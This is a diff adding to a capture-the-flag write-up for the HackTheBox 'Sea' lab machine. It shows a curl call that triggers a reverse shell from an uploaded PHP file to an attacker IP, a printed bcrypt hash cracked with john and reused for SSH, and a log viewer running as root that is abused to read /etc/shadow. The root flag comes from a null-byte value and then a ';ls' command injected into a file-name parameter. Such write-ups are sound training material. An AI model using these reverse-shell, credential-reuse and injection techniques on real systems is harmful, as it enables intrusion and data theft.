@@ -198,6 +198,8 @@ Since the method in the exploit was complex, I opted to use curl to access the w
 curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.18&lport=4444"
 ````
 the commond worked and i got a reverse shell
+
+
 ![2024-08-13_13-15](https://github.com/user-attachments/assets/b9a8ab01-6126-484a-9e74-b4d3addba8ad)
 
 ### Privilege Escalation
@@ -207,6 +209,95 @@ After obtaining a shell as `www-data`, I upgraded my shell for better interactio
 From the shell at `www-data@sea:/var/www/sea$`, I navigated to the `/data` directory and discovered a `database.js` file. This file contained a hash that could be useful.
 
 Here's a screenshot of the hash found in `database.js`:
+
+![2024-08-13_13-29](https://github.com/user-attachments/assets/5e217df4-766a-4904-ba6c-22d4ced08e4c)
+
+
+## Bcrypt Hash Cracking and SSH Access
+
+### Hash Cracking
+
+I was trying to crack the following bcrypt hash using `john`:
+
+However, john was giving me errors.I noticed that the hash had backslashes escaping the forward slashes, which might have been causing the issue, so I corrected the hash by removing the backslashes. The correct bcrypt hash should have forward slashes (/) without being escaped by backslashes (\). Here's a comparison:
+
+```
+    Original Hash:
+    $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
+
+    Corrected Hash:
+    $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+```
+and john sucessfully cracked the hash
+
+![pass](https://github.com/user-attachments/assets/2fac0a66-c5a9-4211-a995-71624529fe5f)
+
+Gaining Access via SSH
+
+I discovered two users on the host: amay and geo. I tried the cracked password for both users via SSH, and it worked for amay.
+Post-Exploration
+
+Once I gained shell access as the amay user, I ran linpeas to enumerate potential privilege escalation paths.
+While checking open ports on the machine, I noticed that port 8080 was open. Suspecting it might be a web service, I tried to access it using curl:
+```
+amay@sea:/tmp$ curl http://127.0.0.1:8080/
+Unauthorized access
+````
+To investigate further, I decided to port forward the service to my local machine using SSH:
+```
+ssh -L 8080:127.0.0.1:8080 amay@sea.htb
+#this command goes on your local machine
+```
+After setting up the port forwarding, I accessed http://127.0.0.1:8080/ on my web browser, which presented a login prompt.
+
+![port8080](https://github.com/user-attachments/assets/cc10eb7d-2de0-44d4-bc38-aff882f42f83)
+
+
+Nmap Scan and Login Attempt
+
+
+I ran an Nmap scan on the forwarded port to gather more information:
+```
+PORT     STATE  SERVICE    REASON       VERSION
+8080/tcp closed http-proxy conn-refused
+```
+i tried logging in using the credentials amay:mychemicalromance, and it worked. no cause for alarm
+### Discovering Another Web Service
+
+ I discovered another web service that appeared to be a system monitor for internal services. It displayed disk usage and had some system management functions. I was pretty exhausted at this point and wasn't eager to dive into testing yet another web service, so I started clicking buttons hoping for something useful.
+
+One of the options was "Analyse Files" on `access.log`, but it returned a huge amount of gibberish—definitely not something I wanted to sift through manually. I opened Burp Suite to intercept the requests, but realized my proxy wasn't working. It took me a moment to remember that I was port forwarding using Burp's default proxy port, so I had to create a new proxy for port 8081 and update Burp Suite accordingly.
+
+Once I intercepted the request, I noticed something interesting:
+
+![log](https://github.com/user-attachments/assets/57f394e7-b3c0-4eef-be88-70678c722c4e)
+
+
+It seemed like the web service allowed me to specify the exact file to read on the system. I tested this with `/var/log/auth.log` and it worked—indicating that this web service likely had root privileges.
+
+With that knowledge, I decided to take baby steps. I started by reading easier files, and sure enough, I was able to read them without any issues. I then checked for the `shadow` file and was able to access the password hashes.
+
+Finally, I attempted to read `root.txt` but was met with an unexpected message:
+
+![suspic](https://github.com/user-attachments/assets/e98eba5e-2a6e-41d1-bdb0-bb65848e982f)
+
+
+It seemed that the web service required "suspicious traffic" before it shows the contents of the file. hmmm
+i tried inserting null byte at the end of the file name maybe it'll trigger something
+```
+log_file=%2froot%2froot.txt%00&analyze_log=
+```
+i was about to open payload all the things then it occured to me command injection lmao, should be easily flagged so i appended ;ls
+and we got the root flag
+
+![nice2](https://github.com/user-attachments/assets/6ef6421d-0594-453b-b960-e090211c631b)
+
+
+
+
+
+
+
 
 
 
